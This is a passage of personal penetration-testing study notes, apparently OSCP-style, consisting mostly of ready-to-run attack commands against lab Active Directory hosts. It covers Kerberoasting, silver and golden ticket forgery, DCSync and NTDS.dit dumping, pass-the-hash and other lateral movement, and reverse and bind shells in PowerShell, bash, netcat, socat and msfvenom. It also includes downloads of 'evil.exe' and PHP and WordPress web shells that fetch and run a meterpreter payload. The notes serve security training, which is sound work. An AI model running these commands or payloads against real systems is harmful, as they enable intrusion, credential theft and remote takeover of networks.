hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Perform Kerberoasting from Linux

```bash
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

If `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," synchronize the time of the Kali machine with the domain controller. Use `ntpdate` or `rdate` to do so.

Request the service ticket (the registered SPN for the IIS web server in the domain is `HTTP/CorpWebServer.corp.com`)

The `System.IdentityModel` namespace is not loaded into a PowerShell instance by default.

```pwsh
Add-Type -AssemblyName System.IdentityModel
```

Requesting a service ticket

```pwsh
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

After execution, the requested service ticket should be generated by the domain controller and loaded into the memory.

Use the built-in `klist` command to display all cached Kerberos tickets for the current user

Mimikatz can also export tickets to the hard drive and import tickets into LSASS.

```
kerberos::list /export
```

```bash
sudo apt install kerberoast

python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi 
```

### Silver Tickets

The application executing in the context of the service account checks the user's permissions from the **group memberships included in the service ticket**.

However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. The application blindly trusts the integrity of the service ticket since it is encrypted with a password hash.

**Privileged Account Certificate (PAC) validation** is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately, service applications rarely perform PAC validation.

E.g., If we authenticate against an IIS server that is executing in the context of the service account `iis_service`, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.

With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (e.g., the IIS application) with any permissions we desire.

=> Silver ticket

If the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

In general, 3 pieces of information to create a silver ticket are:

•	SPN password hash
•	Domain SID
•	Target SPN

Confirm that our current user has no access to the resource of the HTTP SPN mapped to iis_service

```pwsh
iwr -UseDefaultCredentials http://web04
```

Since on this machine, iis_service has an established session, use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service) "4d28cf5252d39971419580a51484ca09"

Launch Mimikatz, use `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials.

```
privilege::debug
sekurlsa::logonpasswords
```

Obtain the domain SID (**S-1-5-21-1987370270-658905905-1781884369**-1105)

```pwsh
whoami /user
```

* The domain SID (/sid:) 
* Domain name (/domain:)
* The target where the SPN runs (/target:)
* The SPN protocol (/service:)
* NTLM hash of the SPN (/rc4:)
* /ptt: Inject the forged ticket into the memory of the machine we execute the command on
* /user: an existing domain user

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

exit
```

From the perspective of the IIS application, the current user will be both the built-in local administrator (Relative Id: 500) and a member of several highly-privileged groups, including the **Domain Admins** group (Relative Id: 512)

```pwsh
klist
```

```pwsh
iwr -UseDefaultCredentials http://web04
```

Microsoft created a security patch to update the PAC structure from October 11, 2022: The extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist.

### Domain Controller Synchronization

In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API.

The domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

To launch such a replication, a user needs to have the **Replicating Directory Changes, Replicating Directory Changes All**, and **Replicating Directory Changes in Filtered Set** rights. By default, members of the **Domain Admins, Enterprise Admins, and Administrators** groups have these rights assigned.

=> In a **dcsync** attack, we impersonate a domain controller. This allows us to request any user credentials (NTLM hash) from the domain.

```
lsadump::dcsync /user:corp\dave
```

Crack NTLM hashes 

```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Perform the dcsync attack from Linux with `192.168.50.70` as the IP of the domain controller

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"password"@192.168.50.70
```

# Lateral Movement in Active Directory

UAC remote restrictions does not apply to domain users.

## WMI

**WMI** is capable of creating processes via the **Create** method from the **Win32_Process** class. It communicates through Remote Procedure Calls (RPC) over port **135** for remote access and uses a higher-range port (19152-65535) for session data.

To create a process on the **remote target** via WMI, we need credentials of a member of the **Administrators** local group, which can also be a domain user.

```bat
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

Translating this attack into PowerShell

```pwsh
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

$command = 'powershell -nop -w hidden -e <cmd>';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

`encode.py`

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

## WinRM

**WinRM** can be employed for remote hosts management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port **5985** for encrypted HTTPS traffic and port 5986 for plain HTTP.

WinRM is implemented in built-in utilities, such as winrs (Windows Remote Shell).

winrs only works for domain users. The domain user needs to be part of the **Administrators** or **Remote Management Users** group on the target host.

```bat
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e <cmd>"
```

PowerShell also has WinRM built-in capabilities called **PowerShell remoting**.

```pwsh
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession 1
```

```pwsh
$dcsesh = New-PSSession -Computer SANDBOXDC
Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
```

**PowerShell Remoting** by default uses **WinRM** for Cmdlets such as `Enter-PSSession` => User needs to be in the local group **Windows Management Users**. However, instead of WinRM, **SSH** can also be used for PowerShell remoting.

Note that creating a PowerShell remoting session via WinRM in a **bind shell** can cause unexpected behavior.

```pwsh
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "password"
```

## SysInternals PsExec

* The user that authenticates to the target machine needs to be part of the **Administrators local group**
* The `ADMIN$` share must be available
* **File and Printer Sharing** has to be turned on. 

The last two requirements are the default settings on modern Windows Server systems.

To execute the command remotely, PsExec:
- Writes `psexesvc.exe` into the `C:\Windows` directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of `psexesvc.exe`

```pwsh
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

## Pass the Hash

To authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password.

Tools: PsExec from Metasploit, Passing-the-hash toolkit, and Impacket.

Most tools that are built to abuse PtH can be leveraged to start a Windows service (e.g., cmd.exe or an instance of PowerShell) and communicate with it using **Named Pipes**. This is done using the **Service Control Manager** API.

Unless we want to gain RCE, PtH does not need to create a Windows service for any other usage, such as accessing an SMB share.

Similar to PsExec, this technique requires an SMB connection through the firewall (commonly port **445**) and the Windows **File and Printer Sharing** feature to be enabled. This technique also requires the admin share called **ADMIN$** to be available and **local administrative rights**.

This method works for AD **domain accounts** (need to be part of the **Administrators local group**) and the built-in local **administrator** account. However, due to the 2014 security update, this technique can not be used to authenticate as any other local admin account.

```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73

impacket-wmiexec -hashes :369def79d8372408bf6e93364cc93075 corp/jen@192.168.146.73
```

pth-toolkit

```bash
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

## Overpass the Hash

With overpass the hash, we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then obtain a Ticket Granting Service (TGS).

To have a new PowerShell session to execute commands as jen (NTLM hash: 369def79d8372408bf6e93364cc93075)

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

Generate a TGT by authenticating to a network share on the files04 server

```pwsh
net use \\files04
```

Converted our NTLM hash into a Kerberos TGT -> use any tools that rely on Kerberos authentication e.g. the PsExec application from Microsoft.

PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, reuse the TGT to obtain code execution on the files04 host.

```pwsh
.\PsExec.exe \\files04 cmd
```

## Pass the Ticket

TGS may be **exported** and re-injected elsewhere on the network and then used to authenticate to a specific service.

If the service tickets belong to the current user, then no **administrative privileges** are required.

E.g., To abuse an already existing session of dave. The dave user has privileged access to the backup folder located on WEB04 where our logged in user jen does not.

Extract all the current TGT/TGS in memory which is then saved to disk in the **kirbi** mimikatz format.

```
privilege::debug
sekurlsa::tickets /export
```

Verify newly generated tickets

```pwsh
dir *.kirbi
```

Inject dave's WEB04 TGS into our own session

```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

```pwsh
ls \\web04\backup
```

## DCOM

Interaction with DCOM is performed over RPC on TCP port 135 and **local administrator** access is required to call the DCOM Service Control Manager.

A collection of various DCOM lateral movement techniques: `https://www.cybereason.com/blog/dcom-lateral-movement-techniques`

Microsoft Management Console (MMC) COM application is employed for scripted automation of Windows systems.

The MMC Application Class allows the creation of Application Objects, which expose the **ExecuteShellCommand** method under the **Document.ActiveView** property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for **local administrators**.

Discover its available methods and objects using the `Get-Member` cmdlet

The ExecuteShellCommand method accepts 4 parameters: Command, Directory, Parameters, and WindowState.

```pwsh
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e ...","7")
```

Run macro in a workbook remotely

```pwsh
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```

## Golden Ticket

When a user submits a request for a TGT, the KDC encrypts the TGT with the password hash of a domain user account called **krbtgt** known only to the KDCs in the domain.

Got the krbtgt password hash, we could create our own self-made custom TGTs, aka golden tickets.

Extract the **password hash of the krbtgt account** with Mimikatz

```
privilege::debug
lsadump::lsa /patch
```

While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources.

E.g., Create a TGT stating that a non-privileged user is actually a member of the **Domain Admins** group, and the domain controller will trust it because it is correctly encrypted.

Forge and inject our golden ticket:

* NTLM hash of the krbtgt account
* domain SID

Creating the golden ticket and injecting it into memory does **not require any administrative privileges** and can even be performed from a **computer that is not joined to the domain**.

- Launch mimikatz and delete any existing Kerberos tickets with `kerberos::purge`.
- Supply the domain SID (gather with `whoami /user`) to the Mimikatz `kerberos::golden` command
- Starting July 2022, we'll need to provide an existing account, e.g., jen

```
kerberos::purge

kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-198737-658905-178188 /krbtgt:1693c6cefafffc7af11ef34d1c /ptt
```

Launch a new command prompt 

```
misc::cmd
```

```bat
PsExec64.exe \\DC1 cmd.exe
```

If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked (Access is denied.)

```bat
psexec.exe \\192.168.50.70 cmd.exe
```

## Shadow Copies

A Shadow Copy, aka Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes.

To manage volume shadow copies, the Microsoft signed binary `vshadow.exe` is offered as part of the Windows SDK.

As **domain admins**, create a Shadow Copy that will allow us to extract the AD Database `NTDS.dit` database file > extract every user credential offline on our local Kali machine.

Connect as the domain admin user to the **domain controller** and launch from an elevated prompt

* -nw: disable writers, which speeds up backup creation
* -p: store the copy on disk

```bat
vshadow.exe -nw -p  C:
```

```bat
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

Save the SYSTEM hive from the Windows registry

```bat
reg.exe save hklm\system c:\system.bak
```

Extract the credential materials 

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

# Reverse Shell

## Listener

```bash
nc -nvlp 4444
```

```bash
msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run"
```

```bash
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 10.11.0.4;set LPORT 80;run"
```

## PowerShell

```bat
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Bind Shells

```bat
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

## Bash

```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
```

## Socat

Reverse Shell

```bash
socat -d -d TCP4-LISTEN:443 STDOUT

socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

Encrypted Reverse Shell

```bash
socat -d -d OPENSSL-LISTEN:1337,cert=reverse_shell.pem,verify=0 STDOUT

socat OPENSSL:10.11.0.22:1337,verify=0 EXEC:/bin/bash
```

Bind Shell

```bash
socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
```

Encrypted Bind Shell

Create a self-signed certificate

* req: initiate a new certificate signing request
* -newkey: generate a new private key
* rsa:2048: use RSA encryption with a 2,048-bit key length.
* -nodes: store the private key without passphrase protection
* -keyout: save the key to a file
* -x509: output a self-signed certificate instead of a certificate request
* -days: set validity period in days
* -out: save the certificate to a file

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt

cat bind_shell.key bind_shell.crt > bind_shell.pem
```

```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

socat - OPENSSL:10.11.0.4:443,verify=0
```

## Powercat

```pwsh
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

```pwsh
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACA....
```

```pwsh
powercat -l -p 443 -e cmd.exe
```

# File Transfer

Upload the file to the SMB share

```bash
smbclient //192.168.50.195/share -c 'put test.txt'
```

```bash
scp cve-2017-16995.c joe@192.168.123.216:

wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel

axel -a -n 20 -o report_axel.pdf https://www.example.com/report.pdf
```

```pwsh
wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe

iwr -Uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

```bat
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```

```bat
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

```bat
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

## Socat

```bash
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

## Powercat

```bash
sudo nc -lnvp 443 > receiving_powercat.ps1
```

```pwsh
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

## Pure-FTPd

```bash
sudo apt install pure-ftpd

sudo systemctl restart pure-ftpd
```

`sudo ./setup-ftp.sh`

```bash
#!/bin/bash

sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

## Non-Interactive FTP Download

`ftp.txt`

```
echo open 10.11.0.4 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```

```bat
ftp -v -n -s:ftp.txt
```

## Windows Downloads using VBScript

Simple HTTP downloader (in Windows XP, 2003)

```bat
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```

```bat
cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

## Windows Downloads with exe2hex and PowerShell

```bash
upx -9 nc.exe
```

```bash
exe2hex -x nc.exe -p nc.cmd
```

Copy and paste `nc.cmd` script into a shell on our Windows machine and run it, it will create a perfectly-working copy of our original `nc.exe`.

## Windows Uploads Using Windows Scripting Languages

`upload.php`

```php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

```bash
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```

```bat
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

## Uploading Files with TFTP

```bash
sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

```bat
tftp -i 10.11.0.4 put important.docx
```

```pwsh
$dcsesh = New-PSSession -Computer SANDBOXDC
Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```

# Linux Miscellaneous

```bash
sudo updatedb
locate sbd.exe
```

```bash
find / -name nc.exe 2>/dev/null
```

```bash
man -k passwd
man -k '^passwd$'
man 5 passwd

apropos partition
```

```bash
mkdir -p test/{recon,exploit,report}
```

```bash
apt-cache search pure-ftpd
apt show resource-agents
```

```bash
echo "I need to try hard" | sed 's/hard/harder/'
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
```

```bash
comm scan-a.txt scan-b.txt
comm -12 scan-a.txt scan-b.txt

diff -c scan-a.txt scan-b.txt
diff -u scan-a.txt scan-b.txt

vimdiff scan-a.txt scan-b.txt
```

```bash
nc <IP> 80
socat - TCP4:<IP>:80

sudo nc -lvp localhost 443
sudo socat TCP4-LISTEN:443 STDOUT
```

```bash
gcc cve-2017-16995.c -o cve-2017-16995
```

## SSH

```bash
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52

chmod 600 id_rsa
ssh -i id_rsa -p 2222 offsec@mountain.com

rm ~/.ssh/known_hosts
```

## iptables

-I option to insert a new rule into a given chain, -s to specify a source IP address, -d to specify a destination IP address

-Z zero the packet and byte counters in all chains

```bash
sudo iptables -I INPUT 1 -s 192.168.50.149 -j ACCEPT
sudo iptables -I OUTPUT 1 -d 192.168.50.149 -j ACCEPT
sudo iptables -Z
sudo iptables -vn -L
```

## Bash Scripting

```bash
#!/bin/bash
# elif example

read -p "What is your age: " age

if [ $age -lt 16 ]
then
  echo "You might need parental permission to take this course!"
elif [ $age -gt 60 ]
then
  echo "Hats off to you, respect!"
else
  echo "Welcome to the course!"
fi
```

```bash
grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found!"
```

```bash
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"

for i in {1..10}; do echo 10.11.1.$i;done
```

```bash
#!/bin/bash
# while loop example

counter=1

while [ $counter -lt 10 ]
do
  echo "10.11.1.$counter"
  ((counter++))
done
```

```bash
#!/bin/bash
# function return value example

return_me() {
  echo "Oh hello there, I'm returning a random value!"
  return $RANDOM
}

return_me

echo "The previous function returned a value of $?"
```

Create an SSH keypair

```bash
ssh-keygen
```

Insert the previously created public key into `authorized_keys` file 

```bash
cat filename.pub > authorized_keys
```

Ignore any commands the user supplies with the command option in ssh. Prevent agent and X11 forwarding with the no-agent-forwarding and no-X11-forwarding options. Prevent the user from being allocated a tty device with the no-tty option. To allows the owner of the private key, to log in to our Kali machine but prevents them from running commands and only allows for port forwarding

`authorized_keys`

```
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADA/IPHxsPg+fflPKW4N6pK0ZXS/ENC68Py+NhtW1c2So95ARwCa/H/d02iOWCLGEav2V1R9xk87xV/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
```

# Windows Miscellaneous

```pwsh
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

Start cmd as user backupadmin

```bat
runas /user:backupadmin cmd
```

```pwsh
powershell -ep bypass
```

Display the integrity level of the current process by retrieving and reviewing the assigned access token

```pwsh
Import-Module NtObjectManager 
Get-NtTokenIntegrityLevel
```

```pwsh
# find a better way to automate this
$username = "sandbox\alex"
$pwdTxt = "Ndawc*nRoqkC+haZ"
$securePwd = $pwdTxt | ConvertTo-SecureString 
$credObject = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePwd

# Enable remote management on Poultry
$remoteKeyParams = @{
ComputerName = "POULTRY"
Path = 'HKLM:\SOFTWARE\Microsoft\WebManagement\Server'
Name = 'EnableRemoteManagement'
Value = '1'
}
Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject

# Strange calc processes running lately
Stop-Process -processname calc
```

Install the Telnet client

```pwsh
dism /online /Enable-Feature /FeatureName:TelnetClient
```

# Miscellaneous

PHP Web Shell

```php
<?php echo system($_GET['cmd']); ?>
```

```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

Add new Wordpress web shell plugin

```bash
cd /usr/share/seclists/Web-Shells/WordPress/
zip plugin-shell.zip plugin-shell.php

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf

curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf
```

find the database configuration for WordPress

```bash
cat wp-config.php
```

```bash
git status
git log
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
```

Upgrading a Non-Interactive Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Start a built-in web server

```bash
php -S 0.0.0.0:8000
```

```bash
ruby -run -e httpd . -p 9000
```

```bash
busybox httpd -f -p 10000
```

Simulate an admin user login: `powershell -ep Bypass -File admin_login.ps1`

```pwsh
$username="admin"
$password="p@ssw0rd"
$url_login="127.0.0.1/login.php"

$ie = New-Object -com InternetExplorer.Application
$ie.Visible = $true
$ie.navigate("$url_login")
while($ie.ReadyState -ne 4){ start-sleep -m 1000}
$ie.document.getElementsByName("username")[0].value="$username"
$ie.document.getElementsByName("password")[0].value="$password"
start-sleep -m 10
$ie.document.getElementsByClassName("btn")[0].click()
start-sleep -m 100
$ie.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)
```
